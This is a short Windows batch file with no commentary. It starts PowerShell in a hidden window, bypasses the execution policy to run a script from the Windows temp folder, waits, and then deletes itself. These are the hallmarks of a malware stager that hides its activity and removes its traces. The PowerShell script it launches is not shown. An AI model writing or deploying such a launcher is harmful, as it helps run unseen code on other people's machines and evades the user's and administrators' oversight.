@ echo off

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -executionpolicy bypass -file c:\windows\temp\100.ps1
Timeout /t 15
del %0
exit 